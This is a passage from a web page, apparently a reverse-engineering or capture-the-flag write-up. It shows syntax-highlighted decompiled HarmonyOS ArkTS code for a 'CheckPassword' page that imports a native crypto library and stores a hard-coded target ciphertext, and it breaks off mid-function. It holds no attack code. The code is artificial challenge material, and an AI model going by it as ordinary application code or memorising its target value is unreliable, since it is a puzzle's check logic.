</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// .abcD 2025-11-20T03:32:54.121100256</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// &amp;entry/src/main/ets/pages/Index&amp;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">nativeCrypto_</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="err">&#39;</span><span class="nd">@normalized</span><span class="p">:</span><span class="n">Y</span><span class="o">&amp;&amp;&amp;</span><span class="n">libentry</span><span class="p">.</span><span class="na">so</span><span class="o">&amp;</span><span class="p">.</span><span class="na">mjs</span><span class="err">&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">util_</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="err">&#39;</span><span class="nd">@ohos</span><span class="p">:</span><span class="n">util</span><span class="p">.</span><span class="na">mjs</span><span class="err">&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">let</span><span class="w"> </span><span class="n">r6</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">var</span><span class="w"> </span><span class="n">x_1_1</span><span class="p">,</span><span class="w"> </span><span class="n">x_1_2</span><span class="p">,</span><span class="w"> </span><span class="n">x_1_3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">x_1_2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="p">.</span><span class="na">target</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">x_1_3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">&#39;</span><span class="n">finalizeConstruction</span><span class="err">&#39;</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">ViewPU</span><span class="p">.</span><span class="na">prototype</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">r6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">r6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">r6</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Reflect</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">globalThis</span><span class="p">.</span><span class="na">ViewPU</span><span class="p">.</span><span class="na">prototype</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">finalizeConstruction</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">const</span><span class="w"> </span><span class="n">r22</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CheckPassword</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">ViewPU</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">constructor</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span><span class="w"> </span><span class="n">p2</span><span class="p">,</span><span class="w"> </span><span class="n">p3</span><span class="p">,</span><span class="w"> </span><span class="n">p4</span><span class="p">,</span><span class="w"> </span><span class="n">p5</span><span class="p">,</span><span class="w"> </span><span class="n">p6</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">let</span><span class="w"> </span><span class="n">r6</span><span class="p">,</span><span class="w"> </span><span class="n">r12</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">r6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p4</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">p4</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="n">undefined</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">r6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">r12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p5</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">p5</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="n">undefined</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">r12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">super</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span><span class="w"> </span><span class="n">p3</span><span class="p">,</span><span class="w"> </span><span class="n">r6</span><span class="p">,</span><span class="w"> </span><span class="n">p6</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">typeof</span><span class="w"> </span><span class="n">r12</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="err">&#39;</span><span class="n">function</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">this</span><span class="p">.</span><span class="na">paramsGenerator_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r12</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">__inputText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">ObservedPropertySimplePU</span><span class="p">(</span><span class="err">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">inputText</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">__isShowPopup</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">ObservedPropertySimplePU</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">isShowPopup</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">__popupMessage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">ObservedPropertySimplePU</span><span class="p">(</span><span class="err">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">popupMessage</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">targetCipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">yaApcJ5GoyGwhARDXZLQUdntqPpmVu2GuTChnsLoj5d8ABinwGSsgpGaiPWYbHTTbbzSXxLXwoLgjR1YgquyEnK</span><span class="err">&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">setInitiallyProvidedValue</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">finalizeConstruction</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">setInitiallyProvidedValue</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">p1</span><span class="p">.</span><span class="na">inputText</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="n">undefined</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">this</span><span class="p">.</span><span class="na">inputText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p1</span><span class="p">.</span><span class="na">inputText</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">p1</span><span class="p">.</span><span class="na">isShowPopup</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="n">undefined</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">this</span><span class="p">.</span><span class="na">isShowPopup</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p1</span><span class="p">.</span><span class="na">isShowPopup</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">p1</span><span class="p">.</span><span class="na">popupMessage</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="n">undefined</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">this</span><span class="p">.</span><span class="na">popupMessage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p1</span><span class="p">.</span><span class="na">popupMessage</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">p1</span><span class="p">.</span><span class="na">targetCipher</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="n">undefined</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">this</span><span class="p">.</span><span class="na">targetCipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p1</span><span class="p">.</span><span class="na">targetCipher</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">updateStateVars</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">purgeVariableDependenciesOnElmtId</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">__inputText</span><span class="p">.</span><span class="na">purgeDependencyOnElmtId</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">__isShowPopup</span><span class="p">.</span><span class="na">purgeDependencyOnElmtId</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">__popupMessage</span><span class="p">.</span><span class="na">purgeDependencyOnElmtId</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">aboutToBeDeleted</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">__inputText</span><span class="p">.</span><span class="na">aboutToBeDeleted</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">__isShowPopup</span><span class="p">.</span><span class="na">aboutToBeDeleted</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">__popupMessage</span><span class="p">.</span><span class="na">aboutToBeDeleted</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">SubscriberManager</span><span class="p">.</span><span class="na">Get</span><span class="p">().</span><span class="na">delete</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">id__</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">aboutToBeDeletedInternal</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">const</span><span class="w"> </span><span class="n">r23</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r22</span><span class="p">.</span><span class="na">prototype</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Object</span><span class="p">.</span><span class="na">defineProperty</span><span class="p">(</span><span class="n">r23</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">inputText</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">get</span><span class="p">:</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">inputText</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">__inputText</span><span class="p">.</span><span class="na">get</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">set</span><span class="p">:</span><span class="w"> </span><span class="n">undefined</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Object</span><span class="p">.</span><span class="na">defineProperty</span><span class="p">(</span><span class="n">r23</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">inputText</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">get</span><span class="p">:</span><span class="w"> </span><span class="n">undefined</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">set</span><span class="p">:</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">inputText</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">__inputText</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Object</span><span class="p">.</span><span class="na">defineProperty</span><span class="p">(</span><span class="n">r23</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">isShowPopup</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">get</span><span class="p">:</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">isShowPopup</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">__isShowPopup</span><span class="p">.</span><span class="na">get</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">set</span><span class="p">:</span><span class="w"> </span><span class="n">undefined</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Object</span><span class="p">.</span><span class="na">defineProperty</span><span class="p">(</span><span class="n">r23</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">isShowPopup</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">get</span><span class="p">:</span><span class="w"> </span><span class="n">undefined</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">set</span><span class="p">:</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">isShowPopup</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">__isShowPopup</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Object</span><span class="p">.</span><span class="na">defineProperty</span><span class="p">(</span><span class="n">r23</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">popupMessage</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">get</span><span class="p">:</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">popupMessage</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">__popupMessage</span><span class="p">.</span><span class="na">get</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">set</span><span class="p">:</span><span class="w"> </span><span class="n">undefined</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Object</span><span class="p">.</span><span class="na">defineProperty</span><span class="p">(</span><span class="n">r23</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">popupMessage</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">get</span><span class="p">:</span><span class="w"> </span><span class="n">undefined</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">set</span><span class="p">:</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">popupMessage</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">__popupMessage</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">r23</span><span class="p">.</span><span class="na">initialRender</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">initialRender</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
